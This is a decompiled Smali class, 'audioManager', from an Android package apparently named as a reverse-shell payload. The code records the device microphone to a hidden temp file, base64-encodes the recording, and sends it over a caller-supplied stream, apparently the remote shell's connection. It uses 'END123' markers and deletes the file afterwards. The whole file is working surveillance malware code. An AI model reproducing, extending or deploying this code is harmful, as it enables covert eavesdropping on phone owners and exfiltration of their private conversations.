.class public Lcom/example/reverseshell2/Payloads/audioManager;
.super Ljava/lang/Object;
.source "audioManager.java"


# static fields
.field static TAG:Ljava/lang/String;

.field static audiofile:Ljava/io/File;

.field static outputStream:Ljava/io/OutputStream;


# instance fields
.field context:Landroid/content/Context;

.field mRecorder:Landroid/media/MediaRecorder;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 19
    const-string v0, "audioManagerClass"

    sput-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->TAG:Ljava/lang/String;

    .line 24
    const/4 v0, 0x0

    sput-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 25
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    .line 28
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/audioManager;->context:Landroid/content/Context;

    .line 29
    return-void
.end method

.method private static sendData(Ljava/io/File;)V
    .locals 7
    .param p0, "file"    # Ljava/io/File;

    .line 104
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-string v2, "UTF-8"

    const-wide/32 v3, 0xf42400

    cmp-long v5, v0, v3

    if-lez v5, :cond_0

    .line 106
    :try_start_0
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    const-string v1, "Large file cant transfer \nEND123\n"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 109
    goto :goto_0

    .line 107
    :catch_0
    move-exception v0

    .line 108
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 110
    .end local v0    # "e":Ljava/io/IOException;
    :goto_0
    return-void

    .line 113
    :cond_0
    :try_start_1
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    const-string v1, "stopAudio\n"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 116
    goto :goto_1

    .line 114
    :catch_1
    move-exception v0

    .line 115
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 117
    .end local v0    # "e":Ljava/io/IOException;
    :goto_1
    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    .line 118
    .local v1, "size":I
    new-array v0, v1, [B

    .line 120
    .local v0, "data":[B
    :try_start_2
    new-instance v3, Ljava/io/BufferedInputStream;

    new-instance v4, Ljava/io/FileInputStream;

    invoke-direct {v4, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v3, v4}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    .line 121
    .local v3, "buf":Ljava/io/BufferedInputStream;
    array-length v4, v0

    const/4 v5, 0x0

    invoke-virtual {v3, v0, v5, v4}, Ljava/io/BufferedInputStream;->read([BII)I

    .line 123
    invoke-static {v0, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v4

    .line 124
    .local v4, "encodedAudio":Ljava/lang/String;
    sget-object v5, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v4, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/io/OutputStream;->write([B)V

    .line 125
    sget-object v5, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    const-string v6, "END123\n"

    invoke-virtual {v6, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v5, v2}, Ljava/io/OutputStream;->write([B)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 128
    .end local v3    # "buf":Ljava/io/BufferedInputStream;
    .end local v4    # "encodedAudio":Ljava/lang/String;
    goto :goto_2

    .line 126
    :catch_2
    move-exception v2

    .line 127
    .local v2, "e":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    .line 129
    .end local v2    # "e":Ljava/lang/Exception;
    :goto_2
    return-void
.end method


# virtual methods
.method public startRecording(Ljava/io/OutputStream;)V
    .locals 4
    .param p1, "outputStream"    # Ljava/io/OutputStream;

    .line 34
    sput-object p1, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    .line 37
    :try_start_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    .line 38
    .local v0, "outputDir":Ljava/io/File;
    const-string v1, "sound"

    const-string v2, ".mpeg4"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v1

    sput-object v1, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    .line 42
    .end local v0    # "outputDir":Ljava/io/File;
    nop

    .line 44
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    const-string v2, "UTF-8"

    if-lt v0, v1, :cond_0

    .line 45
    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    .line 46
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 47
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x2

    invoke-virtual {v0, v3}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 48
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    sget-object v3, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0, v3}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/File;)V

    .line 49
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 51
    :try_start_1
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    .line 52
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    .line 53
    const-string v0, "Started Recording Audio\n"

    invoke-virtual {v0, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/io/OutputStream;->write([B)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 54
    :catch_0
    move-exception v0

    .line 55
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 56
    .end local v0    # "e":Ljava/io/IOException;
    :goto_0
    goto :goto_1

    .line 60
    :cond_0
    :try_start_2
    const-string v0, "Lower Android SDK Cant Record Audio\n"

    invoke-virtual {v0, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/io/OutputStream;->write([B)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1

    .line 63
    goto :goto_1

    .line 61
    :catch_1
    move-exception v0

    .line 62
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 66
    .end local v0    # "e":Ljava/io/IOException;
    :goto_1
    return-void

    .line 39
    :catch_2
    move-exception v0

    .line 40
    .restart local v0    # "e":Ljava/io/IOException;
    sget-object v1, Lcom/example/reverseshell2/Payloads/audioManager;->TAG:Ljava/lang/String;

    const-string v2, "external storage access error"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 41
    return-void
.end method

.method public stopRecording(Ljava/io/OutputStream;)V
    .locals 6
    .param p1, "out"    # Ljava/io/OutputStream;

    .line 69
    sput-object p1, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    .line 70
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    const-string v1, "Audio Service Not Started\n"

    const-string v2, "UTF-8"

    if-eqz v0, :cond_1

    .line 72
    :try_start_0
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    .line 80
    goto :goto_0

    .line 73
    :catch_0
    move-exception v0

    .line 75
    .local v0, "e":Ljava/lang/IllegalStateException;
    :try_start_1
    sget-object v3, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 76
    return-void

    .line 77
    :catch_1
    move-exception v1

    .line 78
    .local v1, "ex":Ljava/io/IOException;
    invoke-virtual {v1}, Ljava/io/IOException;->printStackTrace()V

    .line 81
    .end local v0    # "e":Ljava/lang/IllegalStateException;
    .end local v1    # "ex":Ljava/io/IOException;
    :goto_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 82
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v3, 0x0

    cmp-long v5, v0, v3

    if-eqz v5, :cond_0

    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 83
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-static {v0}, Lcom/example/reverseshell2/Payloads/audioManager;->sendData(Ljava/io/File;)V

    goto :goto_1

    .line 86
    :cond_0
    :try_start_2
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    const-string v1, "Error in getting Audio Data\n"

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 87
    return-void

    .line 88
    :catch_2
    move-exception v0

    .line 89
    .local v0, "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 92
    .end local v0    # "e":Ljava/io/IOException;
    :goto_1
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    goto :goto_2

    .line 95
    :cond_1
    :try_start_3
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->outputStream:Ljava/io/OutputStream;

    invoke-virtual {v1, v2}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/OutputStream;->write([B)V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    .line 98
    goto :goto_2

    .line 96
    :catch_3
    move-exception v0

    .line 97
    .restart local v0    # "e":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 100
    .end local v0    # "e":Ljava/io/IOException;
    :goto_2
    return-void
.end method
